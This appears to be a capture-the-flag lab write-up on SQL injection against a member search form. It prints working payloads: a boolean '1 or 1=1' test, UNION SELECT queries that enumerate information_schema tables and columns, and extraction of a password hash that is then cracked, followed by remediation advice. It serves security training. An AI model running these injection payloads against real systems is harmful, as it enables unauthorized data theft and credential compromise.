
## 📌 Breach Name: **Error-Based SQL Injection**

---

## 📌 Vulnerability Type:
- **CWE-89: SQL Injection**
- **CWE-20: Improper Input Validation**

![alt text](https://cwe.mitre.org/data/images/CWE-89-Diagram.png)
---



## 📖 Exploitation Process:

1. **Initial Vulnerability Detection:**
   - Discovered a search form for member information
   - Tested basic SQL injection with boolean-based payload: `1 or 1=1`
   - Application returned all users, confirming SQL injection vulnerability:
     ```
     ID: 1 or 1=1  
     First name: one
     Surname: me

     ID: 1 or 1=1  
     First name: two
     Surname: me

     ID: 1 or 1=1  
     First name: three
     Surname: me

     ID: 1 or 1=1  
     First name: Flag
     Surname: GetThe
     ```

 

2. **List database tables:**

         The SQL UNION operator is used to combine the result sets of two or more SELECT queries into a 
         single result set. It is a powerful tool in SQL that helps aggregate data from multiple tables, 
         especially when the tables have similar structures.
   - Used UNION-based injection to list database tables:
     ```sql
     1 UNION SELECT table_name, null FROM information_schema.tables
     ```
   - Results revealed several tables, including `users` table:
     ```
     ID: 1 UNION SELECT table_name, null FROM information_schema.tables 
     First name: db_default
     Surname: 

     ID: 1 UNION SELECT table_name, null FROM information_schema.tables 
     First name: users
     Surname: 
     ```

3. **List "users" Columns :**
   - Extracted column names from the `users` table:
     ```sql
     1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 0x7573657273--
     ```
   - Results revealed column structure including potentially sensitive fields:
     ```
     First name: user_id
     Surname: 
     
     First name: first_name
     Surname: 
     
     First name: last_name
     Surname: 
     
     First name: town
     Surname: 
     
     First name: country
     Surname: 
     
     First name: planet
     Surname: 
     
     First name: Commentaire
     Surname: 
     
     First name: countersign
     Surname: 
     ```



4. **Additional Information Discovery:**
   - Extracted data from the `Commentaire,countersign` column:
   ```sql
    1 union select Commentaire,countersign from users
     ```
   - Found critical instruction for the final step:
     ```
      ID: 1 union select Commentaire,countersign from users 
      First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
      Surname : 5ff9d0165b4f92b14994e5c685cdce28

     ```



5. **Flag Decryption:**
   - Decrypted the hash `5ff9d0165b4f92b14994e5c685cdce28` to obtain the plaintext: `FortyTwo`
   - Followed instructions: converted to lowercase and applied SHA256 to obtain the final flag

6. **The member search functionality was vulnerable to SQL injection attacks because it used a non-parameterized query structure:**
    ```sql
    SELECT  first_name, last_name 
    FROM users 
    WHERE user_id = [user input]
---



### 🔴 Critical Security Impacts:

- **Complete Data Exposure**: All user information including personal details and password hashes were accessible to attackers
  
- **Authentication Compromise**: MD5 password hashes were successfully extracted and cracked (e.g., "FortyTwo")
  
- **Database Structure Revealed**: Full enumeration of database tables and columns, providing attackers with comprehensive system knowledge
  
---
## 📌 Security Recommendations:

1. **Implement Parameterized Queries:**
   - Use prepared statements with bound parameters
   - Avoid dynamic SQL construction with user input
   - Apply ORM frameworks that handle SQL escaping automatically

2. **Input Validation:**
   - Implement strict input validation for all user-supplied data
   - Apply whitelisting for expected input patterns
   - Reject requests with suspicious SQL characters or keywords

3. **Least Privilege Principle:**
   - Restrict access to system tables like information_schema

4. **Database Hardening:**
   - Encrypt sensitive data stored in the database
   - Use strong hashing algorithms with proper salting for passwords
   - Avoid storing sensitive data in plaintext or with weak encryption



